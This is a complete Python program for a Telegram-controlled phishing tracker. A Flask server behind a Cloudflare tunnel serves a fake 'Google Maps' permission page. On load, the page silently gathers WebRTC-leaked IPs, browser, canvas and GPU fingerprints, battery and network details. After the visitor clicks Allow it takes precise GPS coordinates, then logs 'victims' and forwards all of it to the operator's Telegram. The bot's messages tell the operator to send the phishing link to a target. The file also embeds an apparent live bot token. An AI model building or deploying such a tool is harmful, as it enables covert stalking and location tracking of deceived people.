#!/usr/bin/env python3
"""
Telegram Bot - Location Tracker & Device Fingerprint Collector
Uses direct Telegram Bot API (no async issues with Python 3.13)

Install: pip install flask requests
Optional: cloudflared binary in PATH for tunneling
"""

import subprocess
import threading
import time
import re
import json
import os
import requests
import logging
from datetime import datetime
from flask import Flask, request, jsonify

# ================== CONFIGURATION ==================
TELEGRAM_BOT_TOKEN = "7693373495:AAFY8Ni8oiXILW13Nz2K_OD_HjwxbI8Z5ZQ"       # <-- Set your bot token
YOUR_TELEGRAM_ID = 1977558071                      # <-- Set your Telegram user ID
FLASK_PORT = "8080"
USE_CLOUDFLARED = True                            # Set False if you have a public URL already
POLL_INTERVAL = 1.0                               # Seconds between polling checks

# ================== SETUP ==================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Store captured data in memory
captured_data = []
data_lock = threading.Lock()

# Telegram API base
TG_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# Track last update ID for polling
last_update_id = 0

# ================== UTILITY ==================
def get_real_ip():
    flask_ip = request.remote_addr
    xff = request.headers.get('X-Forwarded-For', '')
    xff_ip = xff.split(',')[0].strip() if xff else None
    cf_ip = request.headers.get('CF-Connecting-IP', '')
    return cf_ip or xff_ip or flask_ip

def format_data_for_telegram(data_dict, title):
    """Format captured data nicely for Telegram message (Markdown)."""
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    lines = [f"📡 *{title}*", f"🕒 `{ts}`"]
    
    for k, v in data_dict.items():
        if k == "Google Maps" and v:
            lines.append(f"🗺️ [{k}]({v})")
        elif k == "Timestamp":
            continue
        else:
            lines.append(f"🔹 *{k}:* `{v}`")
    
    return "\n".join(lines)

def tg_send_message(text, chat_id=None):
    """Send a message to Telegram via the Bot API."""
    if chat_id is None:
        chat_id = YOUR_TELEGRAM_ID
    
    try:
        resp = requests.post(
            f"{TG_API}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": text,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True
            },
            timeout=15
        )
        return resp.json()
    except Exception as e:
        logger.error(f"TG sendMessage failed: {e}")
        return None

def tg_edit_message(text, chat_id, message_id):
    """Edit an existing message."""
    try:
        resp = requests.post(
            f"{TG_API}/editMessageText",
            json={
                "chat_id": chat_id,
                "message_id": message_id,
                "text": text,
                "parse_mode": "Markdown",
                "disable_web_page_preview": True
            },
            timeout=15
        )
        return resp.json()
    except Exception as e:
        logger.error(f"TG editMessage failed: {e}")
        return None

def tg_answer_callback(callback_id, text=None):
    """Answer a callback query."""
    payload = {"callback_query_id": callback_id}
    if text:
        payload["text"] = text
    try:
        requests.post(f"{TG_API}/answerCallbackQuery", json=payload, timeout=10)
    except Exception as e:
        logger.error(f"TG answerCallbackQuery failed: {e}")

# ================== FLASK ROUTES ==================
@app.route('/')
def index():
    ip = get_real_ip()
    ua = request.headers.get('User-Agent', 'Unknown')
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    msg = (
        f"👤 *New Visitor*\n"
        f"🕒 `{ts}`\n"
        f"🌐 *IP:* `{ip}`\n"
        f"💻 *UA:* `{ua[:80]}`"
    )
    
    with data_lock:
        captured_data.append(("visitor", msg, ip))
    
    with open("victims.log", "a") as f:
        f.write(f"[{ts}] IP: {ip} | UA: {ua[:80]}\n")
    
    logger.info(f"Visitor: {ip}")
    
    return HTML_PAGE

@app.route('/collect', methods=['POST'])
def collect_all():
    data = request.json
    ip = get_real_ip()
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    if not data:
        return jsonify({"status": "ok"})

    # --- GPS ---
    if 'lat' in data and 'lon' in data:
        lat, lon = data['lat'], data['lon']
        maps_link = f"https://maps.google.com/?q={lat},{lon}"
        
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Latitude": f"{lat:.6f}",
            "Longitude": f"{lon:.6f}",
            "Accuracy": f"{data.get('acc', 'N/A')}m",
            "Altitude": f"{data.get('alt', 'N/A')}m",
            "Speed": f"{data.get('speed', 'N/A')} km/h",
            "Google Maps": maps_link,
        }, "📍 GPS COORDINATES CAPTURED")
        
        with data_lock:
            captured_data.append(("gps", msg, ip, lat, lon))
        
        with open("gps_links.txt", "a") as f:
            f.write(f"[{ts}] IP: {ip} | {maps_link}\n")
        
        logger.info(f"GPS captured: {lat},{lon} from {ip}")

    # --- WebRTC IP Leak ---
    if 'webrtc_ip' in data:
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "WebRTC IP": data['webrtc_ip'],
        }, "🕸️ WEBRTC IP LEAK")
        with data_lock:
            captured_data.append(("webrtc", msg, ip))

    # --- Device / Battery ---
    if 'battery' in data:
        b = data['battery']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Battery Level": f"{float(b.get('level', 0)) * 100:.0f}%",
            "Charging": b.get('charging', 'N/A'),
            "Network Type": data.get('network', {}).get('type', 'N/A'),
            "Downlink": f"{data.get('network', {}).get('downlink', 'N/A')} Mbps",
        }, "🔋 BATTERY & DEVICE")
        with data_lock:
            captured_data.append(("device", msg, ip))

    # --- Browser Fingerprint ---
    if 'fingerprint' in data:
        fp = data['fingerprint']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Screen": f"{fp.get('width', '?')}x{fp.get('height', '?')}",
            "Platform": fp.get('platform', '?'),
            "Languages": ", ".join(fp.get('languages', [])),
            "Timezone": fp.get('timezone', '?'),
            "Cookies Enabled": fp.get('cookiesEnabled', '?'),
        }, "🖥️ BROWSER FINGERPRINT")
        with data_lock:
            captured_data.append(("fingerprint", msg, ip))

    # --- Canvas Fingerprint ---
    if 'canvas_fp' in data:
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Canvas Hash": data['canvas_fp'][:64] + "...",
        }, "🎨 CANVAS FINGERPRINT")
        with data_lock:
            captured_data.append(("canvas", msg, ip))

    # --- WebGL ---
    if 'webgl' in data:
        w = data['webgl']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Vendor": w.get('vendor', 'N/A'),
            "Renderer": w.get('renderer', 'N/A'),
        }, "🎮 WEBGL / GPU")
        with data_lock:
            captured_data.append(("webgl", msg, ip))

    # --- Extended Network Detector ---
    if 'network_detector' in data:
        nd = data['network_detector']
        msg = format_data_for_telegram({
            "Victim IP": ip,
            "Connection Type": nd.get('type', 'N/A'),
            "Effective Type": nd.get('effectiveType', 'N/A'),
            "RTT": f"{nd.get('rtt', 'N/A')} ms",
            "Downlink": f"{nd.get('downlink', 'N/A')} Mbps",
            "VPN / Proxy Detected": nd.get('vpnDetected', 'N/A'),
            "Tor Detected": nd.get('torDetected', 'N/A'),
            "Public IP": nd.get('publicIP', 'N/A'),
            "ISP": nd.get('ispHints', 'N/A'),
        }, "🌐 NETWORK DETECTOR")
        with data_lock:
            captured_data.append(("network", msg, ip))

    return jsonify({"status": "received"})


# ================== TELEGRAM BOT POLLING ==================
def handle_telegram_updates():
    """Poll Telegram for new updates and respond."""
    global last_update_id
    
    try:
        resp = requests.post(
            f"{TG_API}/getUpdates",
            json={
                "offset": last_update_id + 1,
                "timeout": 30,  # Long poll
                "allowed_updates": ["message", "callback_query"]
            },
            timeout=35
        )
        
        if not resp.ok:
            return
        
        updates = resp.json().get("result", [])
        
        for update in updates:
            update_id = update.get("update_id", 0)
            if update_id > last_update_id:
                last_update_id = update_id
            
            # --- Handle Messages ---
            if "message" in update:
                message = update["message"]
                chat_id = message["chat"]["id"]
                text = message.get("text", "")
                
                # Only respond to our authorized user
                if chat_id != YOUR_TELEGRAM_ID:
                    tg_send_message("⛔ Unauthorized. This bot is private.", chat_id)
                    continue
                
                if text == "/start":
                    handle_start(chat_id)
                elif text == "/link":
                    handle_link(chat_id)
                elif text == "/results":
                    handle_results(chat_id)
                elif text == "/stats":
                    handle_stats(chat_id)
                else:
                    tg_send_message(
                        "🤖 *Tracker Bot Active*\n\n"
                        "Commands:\n"
                        "🔗 `/link` — Get the tracker URL\n"
                        "📊 `/results` — Get captured data\n"
                        "📋 `/stats` — Show statistics",
                        chat_id
                    )
            
            # --- Handle Callback Queries ---
            if "callback_query" in update:
                callback = update["callback_query"]
                cb_id = callback["id"]
                cb_data = callback.get("data", "")
                chat_id = callback["message"]["chat"]["id"]
                message_id = callback["message"]["message_id"]
                
                if chat_id != YOUR_TELEGRAM_ID:
                    tg_answer_callback(cb_id, "⛔ Unauthorized")
                    continue
                
                if cb_data == "new_link":
                    tg_answer_callback(cb_id)
                    handle_link(chat_id)
                elif cb_data == "get_results":
                    tg_answer_callback(cb_id)
                    handle_results(chat_id)
                elif cb_data == "stats":
                    tg_answer_callback(cb_id)
                    handle_stats(chat_id)
    
    except requests.exceptions.Timeout:
        pass  # Long poll timeout is normal
    except Exception as e:
        logger.error(f"Poll error: {e}")

def handle_start(chat_id):
    """Handle /start command."""
    keyboard = {
        "inline_keyboard": [
            [{"text": "🔗 Generate New Link", "callback_data": "new_link"}],
            [{"text": "📊 Get Latest Results", "callback_data": "get_results"}],
            [{"text": "📋 Stats", "callback_data": "stats"}],
        ]
    }
    
    try:
        requests.post(
            f"{TG_API}/sendMessage",
            json={
                "chat_id": chat_id,
                "text": (
                    "🤖 *Tracker Bot Active*\n\n"
                    "Send the phishing link to your target. When they visit it, "
                    "all collected data (GPS, device info, network) will appear here.\n\n"
                    "Use the buttons below or type `/link`, `/results`, `/stats`:"
                ),
                "parse_mode": "Markdown",
                "reply_markup": keyboard
            },
            timeout=15
        )
    except Exception as e:
        logger.error(f"handle_start error: {e}")

def handle_link(chat_id):
    """Send the tracker URL."""
    base_url = None
    if os.path.exists("tunnel_url.txt"):
        with open("tunnel_url.txt", "r") as f:
            base_url = f.read().strip()
    
    if base_url:
        msg = (
            f"✅ *Tracker Link Active*\n\n"
            f"📎 `{base_url}`\n\n"
            f"Send this link to your target. All captured data will "
            f"automatically appear here."
        )
    else:
        msg = (
            "⚠️ Tunnel not yet ready. The Flask server is starting.\n"
            "Wait a moment and check again, or check the console output.\n\n"
            "Type `/link` again in a few seconds."
        )
    
    tg_send_message(msg, chat_id)

def handle_results(chat_id):
    """Send all captured data to the user."""
    with data_lock:
        if not captured_data:
            tg_send_message(
                "📭 *No data captured yet.*\n\n"
                "Send the link to your target first.",
                chat_id
            )
            return
        
        data_copy = captured_data.copy()
        captured_data.clear()
    
    tg_send_message(
        f"📤 *Sending {len(data_copy)} captured data points to you...*",
        chat_id
    )
    
    for item in data_copy:
        msg_text = item[1]
        tg_send_message(msg_text, chat_id)
        time.sleep(0.3)  # Rate limiting

def handle_stats(chat_id):
    """Show simple statistics."""
    with data_lock:
        total = len(captured_data)
        gps_count = sum(1 for d in captured_data if d[0] == "gps")
    
    local_files = []
    if os.path.exists("gps_links.txt"):
        with open("gps_links.txt") as f:
            local_files.append(("GPS entries logged", len(f.readlines())))
    if os.path.exists("victims.log"):
        with open("victims.log") as f:
            local_files.append(("Total visitors logged", len(f.readlines())))
    
    msg = "📊 *Tracker Statistics*\n\n"
    msg += f"🔸 *Pending in memory:* `{total}`\n"
    msg += f"🔸 *GPS captures pending:* `{gps_count}`\n"
    for name, count in local_files:
        msg += f"🔸 *{name}:* `{count}`\n"
    
    tg_send_message(msg, chat_id)


# ================== DATA FORWARDER (background) ==================
def telegram_data_forwarder():
    """Background thread that periodically sends captured data to Telegram."""
    while True:
        time.sleep(8)  # Check every 8 seconds
        
        with data_lock:
            if not captured_data:
                continue
            data_to_send = captured_data.copy()
            captured_data.clear()
        
        for item in data_to_send:
            msg_text = item[1]
            tg_send_message(msg_text)
            time.sleep(0.3)


# ================== BOT POLLER (background) ==================
def bot_poller():
    """Continuously poll Telegram for updates."""
    logger.info("Bot poller started")
    while True:
        try:
            handle_telegram_updates()
        except Exception as e:
            logger.error(f"Bot poller error: {e}")
            time.sleep(5)


# ================== FLASK + TUNNEL ==================
def start_server():
    print("\n" + "=" * 55)
    print("  TELEGRAM LOCATION TRACKER v2")
    print("=" * 55)
    print(f"  Local:    http://localhost:{FLASK_PORT}")
    print("=" * 55 + "\n")
    app.run(host="0.0.0.0", port=int(FLASK_PORT), debug=False, use_reloader=False)

def start_tunnel():
    time.sleep(2)
    print("  [*] Starting Cloudflared tunnel...\n")
    
    process = subprocess.Popen(
        ["cloudflared", "tunnel", "--url", f"http://localhost:{FLASK_PORT}"],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    )
    
    for line in process.stdout:
        match = re.search(r'(https://[a-zA-Z0-9\-]+\.trycloudflare\.com)', line)
        if match:
            url = match.group(1)
            with open("tunnel_url.txt", "w") as f:
                f.write(url)
            
            print("\n" + "=" * 55)
            print("  TUNNEL ACTIVE - SEND THIS LINK:")
            print("=" * 55)
            print(f"\n  {url}\n")
            print("=" * 55 + "\n")
            
            # Notify via Telegram
            msg = (
                f"✅ *Tunnel is Active\!*\n\n"
                f"📎 Tracker Link:\n`{url}`\n\n"
                f"GPS + WebRTC + Device Fingerprint + Network Detector active."
            )
            tg_send_message(msg)
            
            break
    
    process.wait()


# ================== HTML PAGE (same as original, Google Maps themed) ==================
HTML_PAGE = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Maps</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
}

body{
    height:100vh;
    overflow:hidden;
    position:relative;
    background:#1a1a2e;
}

/* Map Background - Real Google Maps iframe */
.map-bg{
    position:fixed;
    inset:0;
    z-index:0;
}

.map-bg iframe{
    width:100%;
    height:100%;
    border:none;
    filter:blur(6px) brightness(0.7);
    transform:scale(1.1);
}

/* Overlay */
.overlay{
    position:fixed;
    inset:0;
    background:rgba(0,0,0,.3);
    z-index:1;
}

/* Glass Popup */
.popup{
    position:absolute;
    top:50%;
    left:50%;
    transform:translate(-50%,-50%);
    z-index:10;

    width:380px;
    padding:30px;

    background:rgba(255,255,255,.15);
    backdrop-filter:blur(20px);
    -webkit-backdrop-filter:blur(20px);

    border:1px solid rgba(255,255,255,.25);
    border-radius:20px;

    text-align:center;
    color:white;

    box-shadow:0 8px 32px rgba(0,0,0,.5);
}

.logo{
    width:70px;
    margin-bottom:15px;
}

h2{
    margin-bottom:8px;
    font-size:22px;
    font-weight:500;
}

p{
    margin-bottom:20px;
    opacity:.9;
    font-size:14px;
    line-height:1.5;
}

.buttons{
    display:flex;
    gap:10px;
}

button{
    flex:1;
    padding:12px 16px;
    border:none;
    border-radius:12px;
    cursor:pointer;
    font-weight:600;
    font-size:15px;
    transition:all 0.2s;
}

.allow{
    background:#4285F4;
    color:white;
}
.allow:hover{
    background:#3367d6;
}
.allow:disabled{
    opacity:0.6;
    cursor:default;
}

.deny{
    background:rgba(255,255,255,.2);
    color:white;
}
.deny:hover{
    background:rgba(255,255,255,.3);
}
.deny:disabled{
    opacity:0.6;
    cursor:default;
}

.hidden{display:none;}
</style>
</head>
<body>

<div class="map-bg">
    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d387190.279915233!2d-74.25987368715497!3d40.69767006458873!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x89c24fa5d33f083b%3A0xe414a1f0af8f5e8d!2sNew+York%2C+NY!5e0!3m2!1sen!2sus!4v1" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
</div>
<div class="overlay"></div>

<div class="popup" id="popup">

    <img class="logo"
    src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg"
    alt="Maps">

    <h2>Allow Location Access</h2>

    <p>
        Google Maps needs access to your device's location to show
        nearby places, traffic updates, and directions.
    </p>

    <div class="buttons">
        <button class="deny" id="denyBtn">Not Now</button>
        <button class="allow" id="allowBtn">Allow</button>
    </div>

</div>

<script>
(function(){
    'use strict';
    let capturedLat = null;
    let capturedLon = null;

    const allowBtn = document.getElementById('allowBtn');
    const denyBtn = document.getElementById('denyBtn');

    function disableButtons(){
        allowBtn.disabled = true;
        denyBtn.disabled = true;
        allowBtn.style.opacity = '0.7';
        denyBtn.style.opacity = '0.7';
    }

    // ========== SILENT DATA COLLECTION ==========
    function collectSilentData(){
        var points = 0;

        // --- WebRTC IP Leak ---
        try{
            var pc = new RTCPeerConnection({
                iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
            });
            pc.createDataChannel('');
            pc.createOffer().then(function(offer){
                return pc.setLocalDescription(offer);
            });
            pc.onicecandidate = function(ice){
                if(!ice || !ice.candidate) return;
                var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
                if(ipMatch){
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({webrtc_ip: ipMatch[1]})
                    }).catch(function(){});
                    points++;
                }
            };
            setTimeout(function(){ try{pc.close();}catch(e){} }, 3000);
        } catch(e){}

        // --- Browser Fingerprint ---
        var fp = {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            platform: navigator.platform,
            languages: navigator.languages ? Array.from(navigator.languages) : [navigator.language],
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookiesEnabled: navigator.cookieEnabled,
            localStorage: typeof(Storage) !== 'undefined' ? true : false,
            sessionStorage: typeof(Storage) !== 'undefined' ? true : false
        };
        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({fingerprint: fp})
        }).catch(function(){});
        points++;

        // --- Canvas Fingerprint ---
        try{
            var can = document.createElement('canvas');
            can.width = 400;
            can.height = 150;
            var ctx = can.getContext('2d');

            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, 400, 150);

            ctx.fillStyle = '#4285F4';
            ctx.fillRect(0, 0, 400, 40);

            ctx.fillStyle = '#ffffff';
            ctx.font = 'bold 22px Arial, sans-serif';
            ctx.textBaseline = 'middle';
            ctx.fillText('Google Maps', 20, 22);

            ctx.beginPath();
            ctx.arc(340, 75, 20, 0, Math.PI * 2);
            ctx.fillStyle = '#ea4335';
            ctx.fill();
            ctx.strokeStyle = '#ffffff';
            ctx.lineWidth = 3;
            ctx.stroke();

            ctx.beginPath();
            ctx.arc(340, 75, 8, 0, Math.PI * 2);
            ctx.fillStyle = '#ffffff';
            ctx.fill();

            ctx.strokeStyle = '#dadce0';
            ctx.lineWidth = 2;
            for (var i = 0; i < 6; i++) {
                ctx.beginPath();
                ctx.moveTo(20, 55 + i * 18);
                ctx.lineTo(280, 55 + i * 18);
                ctx.stroke();
            }

            ctx.fillStyle = '#fbbc04';
            ctx.fillRect(30, 60, 40, 30);
            ctx.fillStyle = '#34a853';
            ctx.fillRect(100, 78, 50, 40);
            ctx.fillStyle = '#4285F4';
            ctx.fillRect(180, 55, 35, 35);
            ctx.fillStyle = '#ea4335';
            ctx.fillRect(230, 90, 45, 25);

            ctx.fillStyle = '#202124';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'top';
            ctx.fillText('Current Location', 20, 120);
            ctx.fillStyle = '#5f6368';
            ctx.font = '12px Arial';
            ctx.fillText('Accuracy: +/- 12m', 180, 122);

            var hash = can.toDataURL('image/png');

            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({canvas_fp: hash})
            }).catch(function(){});
            points++;
        } catch(e){
            console.log('[!] Canvas error:', e.message);
        }

        // --- WebGL ---
        try{
            var canvas = document.createElement('canvas');
            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if(gl){
                var webglInfo = {
                    vendor: gl.getParameter(gl.VENDOR),
                    renderer: gl.getParameter(gl.RENDERER)
                };
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({webgl: webglInfo})
                }).catch(function(){});
                points++;
            }
        } catch(e){}

        // --- Network Info ---
        if(navigator.connection){
            var nc = navigator.connection;
            var netData = {
                type: nc.type || 'unknown',
                effectiveType: nc.effectiveType || 'unknown',
                rtt: nc.rtt,
                downlink: nc.downlink,
                downlinkMax: nc.downlinkMax || 'unknown',
                saveData: nc.saveData || false
            };
            fetch('/collect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({wifi_scan: netData})
            }).catch(function(){});
            points++;
        }

        // --- Battery ---
        if(navigator.getBattery){
            navigator.getBattery().then(function(b){
                var netInfo = {};
                if(navigator.connection){
                    netInfo = {
                        type: navigator.connection.effectiveType,
                        downlink: navigator.connection.downlink
                    };
                }
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        battery: {level: b.level, charging: b.charging},
                        network: netInfo
                    })
                }).catch(function(){});
            }).catch(function(){});
        }

        // ========== NETWORK DETECTOR (Extended) ==========
        function runNetworkDetector(){
            var netDetect = {
                type: 'unknown',
                effectiveType: 'unknown',
                rtt: null,
                downlink: null,
                downlinkMax: null,
                saveData: null,
                ispHints: 'N/A',
                vpnDetected: 'N/A',
                torDetected: 'N/A',
                publicIP: 'N/A',
                dataSavingMode: 'N/A'
            };

            if(navigator.connection){
                var nc = navigator.connection;
                netDetect.type = nc.type || 'unknown';
                netDetect.effectiveType = nc.effectiveType || 'unknown';
                netDetect.rtt = nc.rtt;
                netDetect.downlink = nc.downlink;
                netDetect.downlinkMax = nc.downlinkMax || null;
                netDetect.saveData = nc.saveData || false;
            }

            if(navigator.connection && navigator.connection.saveData){
                netDetect.dataSavingMode = 'Yes';
            } else {
                netDetect.dataSavingMode = 'No';
            }

            try{
                var vpnPC = new RTCPeerConnection({
                    iceServers: [{urls: 'stun:stun.l.google.com:19302'}]
                });
                var detectedIPs = [];
                vpnPC.createDataChannel('');
                vpnPC.createOffer().then(function(offer){
                    return vpnPC.setLocalDescription(offer);
                });
                vpnPC.onicecandidate = function(ice){
                    if(!ice || !ice.candidate) return;
                    var ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(?:\\.[0-9]{1,3}){3})/);
                    if(ipMatch && detectedIPs.indexOf(ipMatch[1]) === -1){
                        detectedIPs.push(ipMatch[1]);
                    }
                };
                setTimeout(function(){
                    try{ vpnPC.close(); } catch(e){}
                    if(detectedIPs.length > 1){
                        netDetect.vpnDetected = 'Possible (' + detectedIPs.join(', ') + ')';
                    }
                }, 3000);
            } catch(e){}

            try{
                fetch('https://api.ipify.org?format=json')
                .then(function(r){ return r.json(); })
                .then(function(ipData){
                    if(ipData && ipData.ip){
                        netDetect.publicIP = ipData.ip;
                    }
                    return fetch('https://ipapi.co/' + (ipData.ip || '') + '/json/');
                })
                .then(function(r){ return r.json(); })
                .then(function(geoData){
                    if(geoData && geoData.org){
                        netDetect.ispHints = geoData.org + (geoData.country_name ? ' (' + geoData.country_name + ')' : '');
                    }
                    if(geoData && geoData.hosting === true){
                        netDetect.vpnDetected = 'Yes (hosting/VPN IP)';
                    }
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({network_detector: netDetect})
                    }).catch(function(){});
                })
                .catch(function(){
                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({network_detector: netDetect})
                    }).catch(function(){});
                });
            } catch(e){
                fetch('/collect', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({network_detector: netDetect})
                }).catch(function(){});
            }
        }

        setTimeout(runNetworkDetector, 1500);

        console.log('[+] Silent data collected: ' + points + ' points sent');
    }

    collectSilentData();

    // ========== GPS ON ALLOW ==========
    allowBtn.addEventListener('click', function(){
        disableButtons();
        allowBtn.textContent = 'Accessing...';

        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                function(pos){
                    capturedLat = pos.coords.latitude;
                    capturedLon = pos.coords.longitude;

                    allowBtn.textContent = 'Location Shared';

                    var gpsData = {
                        lat: capturedLat,
                        lon: capturedLon,
                        acc: pos.coords.accuracy,
                        alt: pos.coords.altitude,
                        speed: pos.coords.speed
                    };

                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify(gpsData)
                    }).catch(function(){});

                    setTimeout(function(){
                        var mapsUrl = 'https://maps.google.com/?q=' + capturedLat + ',' + capturedLon;
                        window.location.href = mapsUrl;
                    }, 2000);
                },
                function(err){
                    var errMsg = 'Location unavailable';
                    if(err.code === 1) errMsg = 'Permission denied';
                    else if(err.code === 2) errMsg = 'Position unavailable';
                    else if(err.code === 3) errMsg = 'Timed out';

                    allowBtn.textContent = errMsg;

                    fetch('/collect', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({gps_error: err.message, gps_code: err.code})
                    }).catch(function(){});

                    setTimeout(function(){
                        window.location.href = 'https://maps.google.com';
                    }, 2000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        } else {
            allowBtn.textContent = 'GPS Unavailable';
            setTimeout(function(){
                window.location.href = 'https://maps.google.com';
            }, 2000);
        }
    });

    // ========== DENY ==========
    denyBtn.addEventListener('click', function(){
        disableButtons();
        denyBtn.textContent = 'Opening...';

        fetch('/collect', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({gps_error: 'User clicked Not Now', gps_code: 1})
        }).catch(function(){});

        setTimeout(function(){
            window.location.href = 'https://maps.google.com';
        }, 1000);
    });
})();
</script>
</body>
</html>
"""

# ================== MAIN ==================
def main():
    """Run everything."""
    
    # 1. Start data forwarder (sends captured data to Telegram automatically)
    forwarder_thread = threading.Thread(target=telegram_data_forwarder, daemon=True)
    forwarder_thread.start()
    
    # 2. Start Telegram bot poller (uses simple HTTP polling, no async issues)
    poller_thread = threading.Thread(target=bot_poller, daemon=True)
    poller_thread.start()
    
    # 3. Start Flask server
    flask_thread = threading.Thread(target=start_server, daemon=True)
    flask_thread.start()
    
    # 4. Start Cloudflared tunnel (if enabled)
    if USE_CLOUDFLARED:
        tunnel_thread = threading.Thread(target=start_tunnel, daemon=True)
        tunnel_thread.start()
    else:
        print(f"\n  [*] Using pre-configured public URL\n")
    
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n  [!] Shutting down...")


if __name__ == '__main__':
    main()